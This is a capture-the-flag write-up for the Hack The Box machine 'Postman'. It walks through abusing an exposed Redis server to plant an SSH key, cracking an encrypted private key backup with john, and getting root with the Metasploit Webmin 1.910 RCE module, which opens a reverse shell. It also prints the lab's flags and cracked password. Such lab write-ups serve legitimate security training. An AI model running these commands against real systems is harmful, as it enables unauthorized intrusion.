---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Webmin-1910-Exploit
  - Redis
---
# Overview

| Name        | Postman   |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sudo nmap -T4 -sC -sV --min-rate 5000 10.129.2.1
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 08:58 PDT
Nmap scan report for 10.129.2.1
Host is up (0.55s latency).
Not shown: 997 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: MiniServ/1.910
|_http-title: Site doesnt have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[postman.png]]

![[postman2.png]]

Enumeration and fuzzing didn't gave anything except `/upload` which had nothing interesting.

We know port `10000` Webmin is running `MiniServ 1.910`.

Since Webmin is running version 1.910, only a few exploits is available. One exploit that is an RCE for version 1.910 requires a valid login when inspecting the exploit.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ sudo nmap -T4 -sC -sV -p- --min-rate 5000 10.129.2.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-14 09:15 PDT
Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 23.65% done; ETC: 09:15 (0:00:10 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.16% done; ETC: 09:16 (0:00:09 remaining)
Warning: 10.129.2.1 giving up on port because retransmission cap hit (6).
Nmap scan report for postman.htb (10.129.2.1)
Host is up (0.34s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Initial Foothold

Ohh we got `6379` with Redis. **Redis** is an open source in-memory data store that can be used as a database, cache, or message broker. It’s often used for caching web pages and reducing the load on servers.

```bash
sudo apt-get install redis-tools
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ redis-cli -h 10.129.2.1
10.129.2.1:6379> config get *
  1) "dbfilename"
  2) "dump.rdb"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 16) ""
 17) "maxmemory"
 18) "0"
 19) "proto-max-bulk-len"
 20) "536870912"
 21) "client-query-buffer-limit"
 22) "1073741824"
 23) "maxmemory-samples"
 24) "5"
 25) "lfu-log-factor"
 26) "10"
 27) "lfu-decay-time"
 28) "1"
 29) "timeout"
 30) "0"
 31) "active-defrag-threshold-lower"
 32) "10"
 33) "active-defrag-threshold-upper"
 34) "100"
 35) "active-defrag-ignore-bytes"
 36) "104857600"
 37) "active-defrag-cycle-min"
 38) "25"
 39) "active-defrag-cycle-max"
 40) "75"
 41) "auto-aof-rewrite-percentage"
 42) "100"
 43) "auto-aof-rewrite-min-size"
 44) "67108864"
 45) "hash-max-ziplist-entries"
 46) "512"
 47) "hash-max-ziplist-value"
 48) "64"
 49) "list-max-ziplist-size"
 50) "-2"
 51) "list-compress-depth"
 52) "0"
 53) "set-max-intset-entries"
 54) "512"
 55) "zset-max-ziplist-entries"
 56) "128"
 57) "zset-max-ziplist-value"
 58) "64"
 59) "hll-sparse-max-bytes"
 60) "3000"
 61) "lua-time-limit"
 62) "5000"
 63) "slowlog-log-slower-than"
 64) "10000"
 65) "latency-monitor-threshold"
 66) "0"
 67) "slowlog-max-len"
 68) "128"
 69) "port"
 70) "6379"
 71) "cluster-announce-port"
 72) "0"
 73) "cluster-announce-bus-port"
 74) "0"
 75) "tcp-backlog"
 76) "511"
 77) "databases"
 78) "16"
 79) "repl-ping-slave-period"
 80) "10"
 81) "repl-timeout"
 82) "60"
 83) "repl-backlog-size"
 84) "1048576"
 85) "repl-backlog-ttl"
 86) "3600"
 87) "maxclients"
 88) "10000"
 89) "watchdog-period"
 90) "0"
 91) "slave-priority"
 92) "100"
 93) "slave-announce-port"
 94) "0"
 95) "min-slaves-to-write"
 96) "0"
 97) "min-slaves-max-lag"
 98) "10"
 99) "hz"
100) "10"
101) "cluster-node-timeout"
102) "15000"
103) "cluster-migration-barrier"
104) "1"
105) "cluster-slave-validity-factor"
106) "10"
107) "repl-diskless-sync-delay"
108) "5"
109) "tcp-keepalive"
110) "300"
111) "cluster-require-full-coverage"
112) "yes"
113) "cluster-slave-no-failover"
114) "no"
115) "no-appendfsync-on-rewrite"
116) "no"
117) "slave-serve-stale-data"
118) "yes"
119) "slave-read-only"
120) "yes"
121) "stop-writes-on-bgsave-error"
122) "yes"
123) "daemonize"
124) "yes"
125) "rdbcompression"
126) "yes"
127) "rdbchecksum"
128) "yes"
129) "activerehashing"
130) "yes"
131) "activedefrag"
132) "no"
133) "protected-mode"
134) "no"
135) "repl-disable-tcp-nodelay"
136) "no"
137) "repl-diskless-sync"
138) "no"
139) "aof-rewrite-incremental-fsync"
140) "yes"
141) "aof-load-truncated"
142) "yes"
143) "aof-use-rdb-preamble"
144) "no"
145) "lazyfree-lazy-eviction"
146) "no"
147) "lazyfree-lazy-expire"
148) "no"
149) "lazyfree-lazy-server-del"
150) "no"
151) "slave-lazy-flush"
152) "no"
153) "maxmemory-policy"
154) "noeviction"
155) "loglevel"
156) "notice"
157) "supervised"
158) "no"
159) "appendfsync"
160) "everysec"
161) "syslog-facility"
162) "local0"
163) "appendonly"
164) "no"
165) "dir"
166) "/etc"
167) "save"
168) "900 1 300 10 60 10000"
169) "client-output-buffer-limit"
170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
171) "unixsocketperm"
172) "0"
173) "slaveof"
174) ""
175) "notify-keyspace-events"
176) ""
177) "bind"
178) "0.0.0.0 ::1"
```

Looking at the config, we find the default folder to be `/var/lib/redis` . Let's check if the redis user has SSH authentication configured by checking for the existence of `.ssh` folder.

```bash
10.129.2.1:6379> config get dir
179) "dir"
180) "/etc"
10.129.2.1:6379> config SET dir /var/lib/redis/.ssh
OK
```

First, create a file named key.txt with the SSH public key in it.

Next, set the file contents as a key in redis.

Save this key into the `/var/lib/redis/.ssh/authorized_keys` file

In the image above, the key named `ssh_key` is saved into the `authorized_keys` file. We can now SSH into the server as the redis user.

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ # 1. Generate SSH keys on YOUR machine
ssh-keygen -t rsa -f redis_key -N ""
Generating public/private rsa key pair.
Your identification has been saved in redis_key
Your public key has been saved in redis_key.pub
The key fingerprint is:
SHA256:7ZqKK/EPMQAmK1JOTUFWCoAQggKkKfFjKK84uZF8amU at0m@DESKTOP-RA9DG2K
The key's randomart image is:
+---[RSA 3072]----+
|/=++=o.          |
|O@ o..           |
|@ * .            |
|=o o     .       |
|  . o   S .      |
|o+.E o   .       |
|B.o+.     .      |
| =+ .o   o       |
|o. .ooo.o        |
+----[SHA256]-----+

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ # 2. Upload public key to target's Redis and configure it
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") | redis-cli -h 10.129.2.1 -x set ssh_key
OK

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ redis-cli -h 10.129.2.1 config set dir /var/lib/redis/.ssh
OK

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ redis-cli -h 10.129.2.1 config set dbfilename authorized_keys
OK

┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ redis-cli -h 10.129.2.1 save
OK
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai]
└─$ ssh -i redis_key redis@10.129.2.1
redis@Postman:~$ ls
6379  dkixshbr.so  dump.rdb  ibortfgq.so  module.o  qcbxxlig.so  vlpaulhk.so
redis@Postman:~$ cd /home
redis@Postman:/home$ ls
Matt
redis@Postman:/home$ cd Matt
redis@Postman:/home/Matt$ ls
user.txt
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
redis@Postman:/home/Matt$ ls -la
total 52
drwxr-xr-x 6 Matt Matt 4096 Sep 11  2019 .
drwxr-xr-x 3 root root 4096 Sep 11  2019 ..
-rw------- 1 Matt Matt 1676 Sep 11  2019 .bash_history
-rw-r--r-- 1 Matt Matt  220 Aug 25  2019 .bash_logout
-rw-r--r-- 1 Matt Matt 3771 Aug 25  2019 .bashrc
drwx------ 2 Matt Matt 4096 Aug 25  2019 .cache
drwx------ 3 Matt Matt 4096 Aug 25  2019 .gnupg
drwxrwxr-x 3 Matt Matt 4096 Aug 25  2019 .local
-rw-r--r-- 1 Matt Matt  807 Aug 25  2019 .profile
-rw-rw-r-- 1 Matt Matt   66 Aug 26  2019 .selected_editor
drwx------ 2 Matt Matt 4096 Aug 26  2019 .ssh
-rw-rw---- 1 Matt Matt   33 Oct 14 16:58 user.txt
-rw-rw-r-- 1 Matt Matt  181 Aug 25  2019 .wget-hsts
redis@Postman:/home/Matt$ cd .ssh
-bash: cd: .ssh: Permission denied
```

```bash
redis@Postman:~$ pwd
/var/lib/redis
redis@Postman:~$ ls -la
total 660
drwxr-x---  7 redis redis   4096 Sep 29  2020 .
drwxr-xr-x 38 root  root    4096 Sep 29  2020 ..
drwxr-xr-x  2 root  root    4096 Oct 25  2019 6379
-rw-------  1 redis redis    506 Oct 14 17:31 .bash_history
drwx------  2 redis redis   4096 Aug 25  2019 .cache
-rw-r-----  1 redis redis  46760 Aug 26  2019 dkixshbr.so
-rw-rw----  1 redis redis     92 Sep 29  2020 dump.rdb
drwx------  3 redis redis   4096 Aug 25  2019 .gnupg
-rw-r-----  1 redis redis  46760 Aug 25  2019 ibortfgq.so
drwxrwxr-x  3 redis redis   4096 Aug 26  2019 .local
-rw-r-----  1 redis redis 440656 Aug 25  2019 module.o
-rw-r-----  1 redis redis  46760 Aug 25  2019 qcbxxlig.so
drwxr-xr-x  2 redis root    4096 Oct 14 17:27 .ssh
-rw-r-----  1 redis redis  46760 Aug 25  2019 vlpaulhk.so
redis@Postman:~$ cat .bash_history
exit
su Matt
pwd
nano scan.py
python scan.py
nano scan.py
clear
nano scan.py
clear
python scan.py
exit
exit
cat /etc/ssh/sshd_config
su Matt
<SNIP>
```

```bash
redis@Postman:~$ find / -user Matt 2>/dev/null
/opt/id_rsa.bak
/home/Matt
/home/Matt/.bashrc
/home/Matt/.bash_history
/home/Matt/.gnupg
/home/Matt/.ssh
/home/Matt/user.txt
/home/Matt/.selected_editor
/home/Matt/.local
/home/Matt/.local/share
/home/Matt/.profile
/home/Matt/.cache
/home/Matt/.wget-hsts
/home/Matt/.bash_logout
/var/www/SimpleHTTPPutServer.py
```

There seem to backup of key `/opt/id_rsa.bak`.

```bash
redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

```bash
ssh2john.py id_rsa.bak > id_rsa.enc
```

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.enc
```

We get pass `computer2008`:

```bash
redis@Postman:~$ su Matt
Password:
Matt@Postman:/var/lib/redis$ cd /home/Matt/
Matt@Postman:~$ cat user.txt
38e9704173334cdf2f450c2393b44bc4
```
# Privilege Escalation
## Webmin-1.910 Exploit

Let's try creds `Matt:computer2008` in site `https://10.129.2.1:10000/`.

We know version is `MiniServ 1.910` and now that we have credentials we can use this exploit.

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/Hentai/Webmin-1.910-Exploit-Script]
└─$ searchsploit Webmin 1.910
------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                            | linux/remote/46984.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                     | linux/webapps/47330.rb
------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

```bash
msf > search webmin 1.910

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_packageup_rce  2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_packageup_rce

msf > use exploit/linux/http/webmin_packageup_rce
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, s
                                         apni, socks4
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910



View the full module info with the info, or info -d command.

msf exploit(linux/http/webmin_packageup_rce) > set RHOSTS 10.129.2.1
RHOSTS => 10.129.2.1
msf exploit(linux/http/webmin_packageup_rce) > set RPORT 10000
RPORT => 10000
msf exploit(linux/http/webmin_packageup_rce) > set USERNAME Matt
USERNAME => Matt
msf exploit(linux/http/webmin_packageup_rce) > set PASSWORD computer2008
PASSWORD => computer2008
msf exploit(linux/http/webmin_packageup_rce) > set LHOST 10.10.14.122
LHOST => 10.10.14.122
msf exploit(linux/http/webmin_packageup_rce) > set LPORT 9001
LPORT => 9001
msf exploit(linux/http/webmin_packageup_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf exploit(linux/http/webmin_packageup_rce) > run
[*] Started reverse TCP handler on 10.10.14.122:9001
[+] Session cookie: a7c4613116bcdf5935bcb16182c41003
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.122:9001 -> 10.129.2.1:56252) at 2025-10-14 09:51:44 -0700
whoami
root
cat /root/root.txt
efd4e9a2bc51c36b60522f953581815d
```

---